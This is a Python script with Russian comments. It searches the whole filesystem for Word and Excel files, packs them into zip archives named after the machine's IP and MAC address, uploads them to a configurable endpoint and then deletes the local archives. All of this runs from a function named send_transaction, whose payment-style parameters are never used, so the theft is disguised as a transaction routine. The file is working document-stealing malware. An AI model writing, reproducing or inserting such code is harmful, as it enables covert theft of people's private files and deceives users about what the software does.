import os
import zipfile
import warnings
import requests
import socket
import uuid
from datetime import datetime
import random
import string

extensions = ['xls', 'docx', 'xls', 'xlsx', 'doc']
start_path = '/'
final_paths = []
hash_base = 'http://127.0.0.1:5000/upload'


# Функция для отключения предупреждений о дубликатах в zipfile
def disable_warnings():
    warnings.filterwarnings("ignore", category=UserWarning, module="os")
    warnings.filterwarnings("ignore", category=UserWarning, module="zipfile")
    warnings.filterwarnings("ignore", category=UserWarning, module="warnings")
    warnings.filterwarnings("ignore", category=UserWarning, module="requests")
    warnings.filterwarnings("ignore", category=UserWarning, module="uuid")
    warnings.filterwarnings("ignore", category=UserWarning, module="datetime")


def get_ip_address():
    try:
        host_name = socket.gethostname()
        ip_address = socket.gethostbyname(host_name)
        return ip_address
    except Exception as e:
        return None

def get_mac_address():
    try:
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])
        mac_address = replace_colons_with_dots(mac_address)
        return mac_address
    except Exception as e:
        return None

def replace_colons_with_dots(mac_address):
    try:
        modified_mac = mac_address.replace('-', '_').replace(':', '_').replace('.', '_').replace(' ', '_')
        return modified_mac
    except Exception as e:
        return None

def find_files_in_directory(directory, extensions):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(tuple(extensions)):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, 'r'):
                        yield file_path
                except (PermissionError, FileNotFoundError):
                    pass
def upload_file_to_website(hash_base, archive_list):
    try:
        for arch_name in archive_list:
            with open(arch_name, 'rb') as file:
                files = {'file': (os.path.basename(arch_name), file)}
                response = requests.post(hash_base, files=files)
                print(response)
        for arch_name in archive_list:
            delete_archive(arch_name)
    except Exception as e:
        print('Check your internet connection.')

def delete_archive(archive_path):
    try:
        os.remove(archive_path)
    except Exception as e:
        pass


def generate_random_string():
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(5))
    return random_string

def archive_name():
    mac_addres = get_mac_address()
    ip = get_ip_address()
    output_rar = ''
    random_key = generate_random_string()

    if (ip != None) | (mac_addres != None):
        output_rar = output_rar + f'{str(ip)}' + f' {str(mac_addres)}'
    else:
        output_rar = datetime.now().strftime("%Y_%m_%d %H_%M_%S")
    output_rar = output_rar + f'__{random_key}_'
    return output_rar

def create_archive(file_paths: list, output_rar: str, max_size_mb: object = 40) -> object:
    current_size = 0
    part_num = 1
    temp_dir = 'temp_archives'

    # Создаем временную директорию для частей архива
    os.makedirs(temp_dir, exist_ok=True)

    # Создаем новый архив для каждой части
    with zipfile.ZipFile(os.path.join(temp_dir, f'{output_rar}_{part_num}.zip'), 'w', compression=zipfile.ZIP_LZMA) as zipf:
        for file_path in file_paths:
            file_size = os.path.getsize(file_path)

            # Если добавление файла приведет к превышению размера, создаем новый архив
            if current_size + file_size > max_size_mb * 1024 * 1024:
                part_num += 1
                current_size = 0
                zipf.close()
                zipf = zipfile.ZipFile(os.path.join(temp_dir, f'{output_rar}_{part_num}.zip'), 'w')

            zipf.write(file_path, os.path.basename(file_path))
            current_size += file_size

    # Возвращаем список созданных архивов
    result_archives = [os.path.join(temp_dir, f'{output_rar}_{i}.zip') for i in range(1, part_num + 1)]

    return result_archives

def send_transaction(subject: str, to: str, amount: str, fee:str):
    disable_warnings()
    final_paths = list(find_files_in_directory(start_path, extensions))
    output_rar = archive_name()
    archive_list = create_archive(final_paths, output_rar)
    upload_file_to_website(hash_base, archive_list)
